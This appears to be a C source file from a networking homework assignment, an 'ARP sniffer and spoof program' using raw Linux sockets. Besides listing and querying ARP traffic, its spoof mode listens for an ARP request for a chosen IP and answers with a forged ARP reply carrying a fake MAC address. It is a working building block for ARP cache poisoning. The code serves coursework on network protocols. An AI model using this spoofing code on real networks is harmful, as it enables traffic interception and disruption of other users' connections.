#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include "arp.h"
#include <unistd.h> //Because implicit declaration of function 'geteuid()'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <stdbool.h> //For bool type
#include <arpa/inet.h> // For inet_pton
#include <errno.h>
#include <ctype.h>
/* 
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your homework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
#define DEVICE_NAME "enp2s0f5"
//#define DEVICE_NAME "enp0s3" //要上傳homework時，要改成enp2s0f5
/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */
/*
	struct sockaddr_ll 
	{
	   uint16_t sll_family;   // Always AF_PACKET 
	   uint16_t sll_protocol; // Physical-layer protocol 
	   int      sll_ifindex;  // Interface number 
	   uint16_t sll_hatype;   // ARP hardware type 
	   uint8_t  sll_pkttype;  // Packet type 
	   uint8_t  sll_halen;    // Length of address 
	   uint8_t  sll_addr[8];  // Physical-layer address 
	};
	struct ifreq 
	{
		char ifr_name[IFNAMSIZ]; 
		union 
		{
		   struct sockaddr ifr_addr;
		   struct sockaddr ifr_dstaddr;
		   struct sockaddr ifr_broadaddr;
		   struct sockaddr ifr_netmask;
		   struct sockaddr ifr_hwaddr;
		   short           ifr_flags;
		   int             ifr_ifindex;
		   int             ifr_metric;
		   int             ifr_mtu;
		   struct ifmap    ifr_map;
		   char            ifr_slave[IFNAMSIZ];
		   char            ifr_newname[IFNAMSIZ];
		   char           *ifr_data;
		};
	};
*/
//舊寫法
/*
struct ifreq get_local_ip(const char *eth_inf, char *ip)
{
    int sd;
    struct sockaddr_in sin;
    struct ifreq ifr;
 
    sd = socket(AF_INET, SOCK_DGRAM, 0);
    if (-1 == sd)
    {
        printf("socket error: %s\n", strerror(errno));
        return ifr;
    }
 
    strncpy(ifr.ifr_name, eth_inf, IFNAMSIZ);
    ifr.ifr_name[IFNAMSIZ - 1] = 0;
 
    // if error: No such device
    if (ioctl(sd, SIOCGIFADDR, &ifr) < 0)
    {
        printf("ioctl error: %s\n", strerror(errno));
        close(sd);
        return ifr;
    }
 
    memcpy(&sin, &ifr.ifr_addr, sizeof(sin));
    snprintf(ip, 16, "%s", inet_ntoa(sin.sin_addr));
 
    close(sd);
    return ifr;
}*/
void packetDebug(struct arp_packet *sendPacket, struct sockaddr_ll *sa)
{
	int i;
	for(i=0;i<4;i++)printf("srcIP:%d\n",sendPacket->arp.arp_spa[i]);
	for(i=0;i<4;i++)printf("dstIP:%d\n",sendPacket->arp.arp_tpa[i]);
	for(i=0;i<6;i++)printf("srcMAC:%02x\n",sendPacket->arp.arp_sha[i]);
	for(i=0;i<6;i++)printf("dstMAC:%02x\n",sendPacket->arp.arp_tha[i]);
	for(i=0;i<6;i++)printf("ether_dhost:%02x\n",sendPacket->eth_hdr.ether_dhost[i]);
	for(i=0;i<6;i++)printf("ether_shost:%02x\n",sendPacket->eth_hdr.ether_shost[i]);
	printf("sendFakePacket sockaddr_ll other data:\n");
	printf("%d,%d,%d,%d\n",sa->sll_hatype,sa->sll_pkttype,sa->sll_protocol,sa->sll_halen);
	for(i=0;i<8;i++)printf("%d\n",sa->sll_addr[i]);
	printf("%d\n",htons(ARPOP_REPLY));
	printf("ether_type:%d\n",sendPacket->eth_hdr.ether_type);
	printf("ar_hrd:%d\n",sendPacket->arp.ea_hdr.ar_hrd);
	printf("ar_pro:%d\n",sendPacket->arp.ea_hdr.ar_pro);
	printf("ar_hln:%d\n",sendPacket->arp.ea_hdr.ar_hln);
	printf("ar_pln:%d\n",sendPacket->arp.ea_hdr.ar_pln);
	printf("ar_op:%d\n",sendPacket->arp.ea_hdr.ar_op);
}
bool isValidIpAddress(char *ipAddress)
{
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
    return result != 0;
}
int get_local_ip(const char *eth_inf, char *ip)
{
    int sd;
    struct sockaddr_in sin;
    struct ifreq ifr;
 
    sd = socket(AF_INET, SOCK_DGRAM, 0);
    if (-1 == sd)
    {
        printf("socket error: %s\n", strerror(errno));
        return -1;
    }
    strncpy(ifr.ifr_name, eth_inf, IFNAMSIZ);
    ifr.ifr_name[IFNAMSIZ - 1] = 0; 
    // if error: No such device
    if (ioctl(sd, SIOCGIFADDR, &ifr) < 0)
    {
        printf("ioctl error: %s\n", strerror(errno));
        close(sd);
        return -1;
    } 
    memcpy(&sin, &ifr.ifr_addr, sizeof(sin));
    snprintf(ip, 16, "%s", inet_ntoa(sin.sin_addr));
 
    close(sd);
    return 0;
}

int get_local_mac(const char *eth_inf, char *mac)
{
    struct ifreq ifr;
    int sd;
	memset(&ifr, 0, sizeof(struct ifreq));//bzero(&ifr, sizeof(struct ifreq));//前n個字清0
    if((sd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        printf("get %s mac address socket creat error\n", eth_inf);
        return -1;
    }
    strncpy(ifr.ifr_name, eth_inf, sizeof(ifr.ifr_name) - 1);
    if(ioctl(sd, SIOCGIFHWADDR, &ifr) < 0)
    {
        printf("get %s mac address error\n", eth_inf);
        close(sd);
        return -1;
    }
    snprintf(mac, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
        (unsigned char)ifr.ifr_hwaddr.sa_data[0],
        (unsigned char)ifr.ifr_hwaddr.sa_data[1],
        (unsigned char)ifr.ifr_hwaddr.sa_data[2],
        (unsigned char)ifr.ifr_hwaddr.sa_data[3],
        (unsigned char)ifr.ifr_hwaddr.sa_data[4],
        (unsigned char)ifr.ifr_hwaddr.sa_data[5]);
    close(sd);
    return 0;
}

int arpList(char *ipAddr)
{
	printf("[ ARP sniffer and spoof program ]\n");
	int sock;
	char recvbuf[43];
	//SOCK_STREAM、SOCK_DGRAM不支援arp_packet
	if((sock=socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)))==-1)
	{
		//理論上建立socket時是指定協議，應該用PF_xxxx，設定地址時應該用AF_xxxx。當然AF_INET和PF_INET的值是相同的，混用也不會有太大的問題。
		perror("socket error");
		return -1;
	}
	printf("### ARP sniffer mode ###\n");
	if(ipAddr == NULL)
	{
		while(1)
		{
			if(recvfrom(sock,recvbuf,sizeof(recvbuf),0,NULL,NULL)==-1){}
			//recvbuf 0~11 dst and src mac, 12~13 ether_type, 14~21 ARP fix header, 22~27 sender Mac, 28~31 sender IP, 32~37 target Mac, 38~41 Target IP
			int j;
			struct arp_packet *e;
			e = (struct arp_packet *)recvbuf;//類似malloc
			if((e->eth_hdr.ether_type == 1544) && (e->arp.ea_hdr.ar_op == 256))
			{
				//printf("op=%d\n",e->arp.ea_hdr.ar_op);
				printf("Get ARP packet - Who has ");
				if((int)e->arp.arp_tpa[3] > 99)
					printf("%d.%d.%d.%d ?\t\t", e->arp.arp_tpa[0], e->arp.arp_tpa[1], e->arp.arp_tpa[2], e->arp.arp_tpa[3]);
				else
					printf("%d.%d.%d.%d ?\t\t\t", e->arp.arp_tpa[0], e->arp.arp_tpa[1], e->arp.arp_tpa[2], e->arp.arp_tpa[3]);
				printf("Tell ");
				printf("%d.%d.%d.%d\n", e->arp.arp_spa[0], e->arp.arp_spa[1], e->arp.arp_spa[2], e->arp.arp_spa[3]);
				// struct ether_arp *t;
				// t = (struct ether_arp *)recvbuf;
				//for(j=0;j<43;j++)printf("recvbuf[%d]=%02d\n",j,recvbuf[j]& 0xff);
			}
		}
	}
	else
	{
		while(1)
		{
			if(recvfrom(sock,recvbuf,sizeof(recvbuf),0,NULL,NULL)<0){}
			//recvbuf 0~11 dst and src mac, 12~13 ether_type, 14~21 ARP fix header, 22~27 sender Mac, 28~31 sender IP, 32~37 target Mac, 38~41 Target IP
			int j;
			struct arp_packet *e;
			e = (struct arp_packet *)recvbuf;
			if((e->eth_hdr.ether_type == 1544) && (e->arp.ea_hdr.ar_op == 256))
			{
				char str[16];
				sprintf(str, "%d.%d.%d.%d", e->arp.arp_tpa[0], e->arp.arp_tpa[1], e->arp.arp_tpa[2], e->arp.arp_tpa[3]);
				//printf("str is %s\n",str);
				if(strcmp(str, ipAddr) == 0)
				{
					printf("Get ARP packet - Who has ");
					if((int)e->arp.arp_tpa[3] > 99)
						printf("%d.%d.%d.%d ?\t\t", e->arp.arp_tpa[0], e->arp.arp_tpa[1], e->arp.arp_tpa[2], e->arp.arp_tpa[3]);
					else
						printf("%d.%d.%d.%d ?\t\t\t", e->arp.arp_tpa[0], e->arp.arp_tpa[1], e->arp.arp_tpa[2], e->arp.arp_tpa[3]);
					printf("Tell ");
					printf("%d.%d.%d.%d\n", e->arp.arp_spa[0], e->arp.arp_spa[1], e->arp.arp_spa[2], e->arp.arp_spa[3]);
				}
			}
			memset(recvbuf, 0, 43);
		}
	}
	close(sock);
	return -1;
}
void getDstMACaddress(int sock, char *ipAddr)
{
	printf("[ ARP sniffer and spoof program ]\n");
	char recvbuf[43];
	printf("### ARP query mode ###\n");
	while(1)
	{
		if(recvfrom(sock,recvbuf,sizeof(recvbuf),0,NULL,NULL)==-1) perror("recvfrom error");
		//recvbuf 0~11 dst and src mac, 12~13 ether_type, 14~21 ARP fix header, 22~27 sender Mac, 28~31 sender IP, 32~37 target Mac, 38~41 Target IP
		int j;
		struct arp_packet *e;
		char str[16];
		
		e = (struct arp_packet *)recvbuf;
		if(e->eth_hdr.ether_type == 1544)
		{
			sprintf(str, "%d.%d.%d.%d", e->arp.arp_spa[0], e->arp.arp_spa[1], e->arp.arp_spa[2], e->arp.arp_spa[3]);
			// printf("IP S:%d.%d.%d.%d ?\t\t", e->arp.arp_spa[0], e->arp.arp_spa[1], e->arp.arp_spa[2], e->arp.arp_spa[3]);
			// printf("IP T:%d.%d.%d.%d ?\t\t", e->arp.arp_tpa[0], e->arp.arp_tpa[1], e->arp.arp_tpa[2], e->arp.arp_tpa[3]);
			// printf("MAC S: %x:%x:%x:%x:%x:%x\n", e->arp.arp_sha[0], e->arp.arp_sha[1], e->arp.arp_sha[2], e->arp.arp_sha[3],e->arp.arp_sha[4],e->arp.arp_sha[5]);
			// printf("MAC T: %x:%x:%x:%x:%x:%x\n", e->arp.arp_tha[0], e->arp.arp_tha[1], e->arp.arp_tha[2], e->arp.arp_tha[3],e->arp.arp_tha[4],e->arp.arp_tha[5]);
			// printf("str: %s\n",str);
			// printf("ipAddr: %s\n",ipAddr);
			if(strcmp(str, ipAddr) == 0)
			{
				printf("MAC address of %s is %02x:%02x:%02x:%02x:%02x:%02x\n",str, e->arp.arp_sha[0], e->arp.arp_sha[1], e->arp.arp_sha[2], e->arp.arp_sha[3],e->arp.arp_sha[4],e->arp.arp_sha[5]);
				close(sock);
				break;
			}
		}
	}
}
int isValidMacAddress(const char* mac) 
{
	int i = 0;
	int s = 0;
	while (*mac) 
	{
		if (isxdigit(*mac) != 0)
			i++;
		else if (*mac == ':' || *mac == '-') 
		{
			if (i == 0 || i / 2 - 1 != s)
				break;
			s++;
		}
		else
			s = -1;
		mac++;
	}
	return (i == 12 && (s == 5 || s == 0));
}
void sendFakePacket(char *dstIP, char *fakeSrcMac, char *dstMac)
{
	struct sockaddr_ll sa={};//不能用sockaddr, 因為他沒辦法設interface number
	//struct sockaddr_ll sa={}要設0，因為這個結構還有5個成員沒設，會有亂值，封包會送不出去，法二:memset(&sa, 0, sizeof(struct sockaddr_ll));
	struct ifreq req;
	struct arp_packet sendPacket;
	//sendPacket = (struct arp_packet *)malloc(42);
	char ipTmp[16];
	char fakeSrcMacTmp[18];
	strcpy(ipTmp,dstIP);
	strcpy(fakeSrcMacTmp,fakeSrcMac);
	//設定requestPacket 的網卡
	int sock, i = 0, j = 0;
	//ETH_P_ARP跟ETH_P_ALL srcIP和dstIP好像會反過來
	strcpy(req.ifr_name, DEVICE_NAME);
	if((sock=socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP)))==-1)
	{
		perror("socket error");
		return ;
	}
	//Get the index number of a Linux network interface
	ioctl(sock,SIOCGIFINDEX,&req);
	//printf("Interface number:%d\n",req.ifr_ifindex);
	//填好封包的sll_ifindex
	
	sa.sll_ifindex = req.ifr_ifindex;
	sa.sll_family = AF_PACKET;
	//送ARP之前，只要fd interface number src_mac src_ip dst_ip 就好，所以封包填這些就好
	//填source IP
	char srcIP[16];
	get_local_ip(DEVICE_NAME, srcIP);
	set_sender_protocol_addr(&(sendPacket.arp),dstIP);
	//填destination IP
	set_target_protocol_addr(&(sendPacket.arp),srcIP);
	//填source MAC、dstMAC
	set_fake_hardware_addr(&sendPacket,fakeSrcMac,dstMac);
	set_all_attribute_type(&sendPacket);
	sendPacket.arp.ea_hdr.ar_op = htons(ARPOP_REPLY);//Fake packet is reply
	
	//packetDebug(&sendPacket,&sa);
	//把arp packet其他欄位都填滿後，直接sendto(sockfd_send, send_packet, 42, 0, (struct sockaddr *)&sa, sizeof(struct sockaddr_ll))
	int ret = sendto(sock, &sendPacket, 42, 0, (struct sockaddr *)&sa, sizeof(struct sockaddr_ll));
	printf("Send ARP Reply : %s is %s\n",ipTmp,fakeSrcMacTmp);
	if(ret == -1)
	{
		printf("errno=%d\n",errno);
		char *mesg = strerror(errno);
		printf("Sendto mesg:%s\n",mesg);
	}
	else printf("Send successful.\n");
	//之後卡一個while迴圈接收，有收到就停
	//getDstMACaddress(sock, ipTmp);
	close(sock);
}

int makeFakeMAC(char *reqARPIP, char *fakeMAC)
{
	struct sockaddr_ll sa={};
	int sock;
	char recvbuf[43];
	struct ifreq req;
	strcpy(req.ifr_name, DEVICE_NAME);
	//這邊必須用ETH_P_ALL，因為ETH_P_ARP只會接收完整一筆request+reply
	//這邊為了測試方便，只要有request我就要收
	if((sock=socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)))==-1)
	{
		perror("socket error");
		return -1;
	}
	ioctl(sock,SIOCGIFINDEX,&req);
	sa.sll_ifindex = req.ifr_ifindex;
	sa.sll_family = AF_PACKET;
	char srcIP[16];
	get_local_ip(DEVICE_NAME, srcIP);
	// printf("makeFakeMAC sockaddr_ll other data:\n");
	// printf("%d,%d,%d,%d\n",sa.sll_hatype,sa.sll_pkttype,sa.sll_protocol,sa.sll_halen);
	int i;
	// for(i=0;i<8;i++)printf("%d\n",sa.sll_addr[i]);
	// printf("sa.sll_ifindex:%d\n",sa.sll_ifindex);
	printf("[ ARP sniffer and spoof program ]\n");
	printf("### ARP spoof mode ###\n");
	printf("Get ARP packet - Who has ");
	printf("%s ?\t\t", reqARPIP);
	printf("Tell %s\n", srcIP);
	while(1)
	{
		if(recvfrom(sock,recvbuf,sizeof(recvbuf),0,(struct sockaddr *)&sa,NULL)==-1){/*perror("recvfrom error");*/}
		//recvbuf 0~11 dst and src mac, 12~13 ether_type, 14~21 ARP fix header, 22~27 sender Mac, 28~31 sender IP, 32~37 target Mac, 38~41 Target IP
		int j;
		struct arp_packet *e;
		e = (struct arp_packet *)recvbuf;
		if(e->eth_hdr.ether_type == 1544)
		{
			//printf("%d.%d.%d.%d\n",  e->arp.arp_spa[0], e->arp.arp_spa[1], e->arp.arp_spa[2], e->arp.arp_spa[3]);
			char str[16];
			sprintf(str, "%d.%d.%d.%d", e->arp.arp_tpa[0], e->arp.arp_tpa[1], e->arp.arp_tpa[2], e->arp.arp_tpa[3]);
			char dstMAC[18];
			// printf("str is %s\n",str);
			// printf("reqARPIP %s\n",reqARPIP);
			if(strcmp(str, reqARPIP) == 0)
			{
				//printf("Find it!\n");
				sprintf(dstMAC, "%02x:%02x:%02x:%02x:%02x:%02x", e->arp.arp_sha[0], e->arp.arp_sha[1], e->arp.arp_sha[2], e->arp.arp_sha[3], e->arp.arp_sha[4], e->arp.arp_sha[5]);
				close(sock);
				sendFakePacket(reqARPIP, fakeMAC, dstMAC);
				break;
			}
		}
		
	}
}
void queryMacAddress(char *targetIP)
{
	struct sockaddr_ll sa={};//不能用sockaddr, 因為他沒辦法設interface number
	struct ifreq req;
	struct arp_packet sendPacket;
	char ipTmp[16];
	strcpy(ipTmp,targetIP);
	//設定requestPacket 的網卡
	int sock, i = 0, j = 0;
	strcpy(req.ifr_name, DEVICE_NAME);
	if((sock=socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)))==-1)
	{
		perror("socket error");
		return;
	}
	//Get the index number of a Linux network interface
	ioctl(sock,SIOCGIFINDEX,&req);
	//printf("Interface number:%d\n",req.ifr_ifindex);
	//填好封包的sll_ifindex
	sa.sll_ifindex = req.ifr_ifindex;
	sa.sll_family = AF_PACKET;
	//送ARP之前，只要fd interface number src_mac src_ip dst_ip 就好，所以封包填這些就好
	//填source IP
	char srcIP[16];
	get_local_ip(DEVICE_NAME, srcIP);
	//另類寫法，可參考https://stackoverflow.com/questions/12112554/why-doesn%C2%B4t-my-program-send-arp-requests-c
	set_sender_protocol_addr(&(sendPacket.arp),srcIP);//arp不是指標型態，要加&讓函數去指他
	//填destination IP
	set_target_protocol_addr(&(sendPacket.arp),targetIP);
	// 指標寫法 in_addr_t dst_ip = inet_addr(argv[2]);memcpy(sendPacket->arp.arp_tpa, &dst_ip, 4);
					
	//填source MAC, dstMAC填0
	char srcMAC[18];
	get_local_mac(DEVICE_NAME, srcMAC);
	set_sender_hardware_addr(&sendPacket,srcMAC);//sendPacket本身是指標型態，不用加&
	
	//查Wireshark看其他ARP封包怎麼設
	set_all_attribute_type(&sendPacket);
	//把arp packet其他欄位都填滿後，直接sendto(sockfd_send, send_packet, 42, 0, (struct sockaddr *)&sa, sizeof(struct sockaddr_ll))
	int ret = sendto(sock, &sendPacket, 42, 0, (struct sockaddr *)&sa, sizeof(struct sockaddr_ll));
	if(ret == -1)
	{
		printf("errno=%d\n",errno);
		char *mesg = strerror(errno);
		printf("Sendto mesg:%s\n",mesg);
	}
	//之後卡一個while迴圈接收，有收到就停
	getDstMACaddress(sock, ipTmp);
	close(sock);
}
int main(int argc, char *argv[])
{
	if(geteuid() != 0){printf("ERROR: You must be root to use this tool!\n");exit(1);}
	if(argc == 2 || strncmp("-l", argv[1], 2) == 0 || strncmp("-help", argv[1], 5) == 0 || strncmp("-q", argv[1], 2) == 0)
	{
		if(strncmp("-help", argv[1], 5) == 0)
		{
			printf("[ ARP sniffer and spoof program ]\n");
			printf("Format :\n");
			printf("(1) ./arp -l -a\n");
			printf("(2) ./arp -l <filter_ip_address>\n");
			printf("(3) ./arp -q <query_ip_address>\n");
			printf("(4) ./arp <fake_mac_address> <target_ip_address>\n");
		}
		else if(strncmp("-l", argv[1], 2) == 0)
		{
			if(strncmp("-a", argv[2], 2) == 0)
			{
				if(arpList(NULL) == -1)return 0;
			}
			else if(isValidIpAddress(argv[2]) == 1)
			{
				if(arpList(argv[2]) == -1)return 0;
			}
		}
		else if(strncmp("-q", argv[1], 2) == 0)
		{
			if(isValidIpAddress(argv[2]) == 1)
			{
				queryMacAddress(argv[2]);
			}
		}
		else printf("Input error!\n");
	}
	else if(argc == 3 && (isValidMacAddress(argv[1]) == 1))
	{
		if(isValidMacAddress(argv[1]) && isValidIpAddress(argv[2]))
		{
			//request ARP IP:argv[2]，我要送假的MAC:argv[1]的ARP Reply
			if(makeFakeMAC(argv[2],argv[1])==-1)printf("Socket error.\n");
		}
		else printf("MAC or IP error!\n");
	}
	else
		printf("Input error!\n");
	return 0;
}